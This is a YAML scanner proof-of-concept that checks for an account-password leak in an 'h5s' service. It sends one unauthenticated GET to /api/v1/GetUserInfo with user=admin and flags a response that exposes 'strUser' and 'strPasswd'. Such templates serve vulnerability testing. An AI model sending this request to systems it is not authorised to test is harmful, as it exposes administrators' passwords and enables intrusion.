name: poc-yaml-h5s-accout-password-leakage
manual: true
transport: http
rules:
  r1:
    request:
      cache: true
      method: GET
      path: /api/v1/GetUserInfo?user=admin&session=
    expression: response.status == 200 && response.body.bcontains(b"strPasswd") && response.body.bcontains(b"admin") && response.body.bcontains(b"strUser")
expression: r1()
detail:
  author: Henry4E36(https://github.com/Henry4E36)
  links:
    - https://mp.weixin.qq.com/s/jw1Kns5CT-YDC6pzFMg-oQ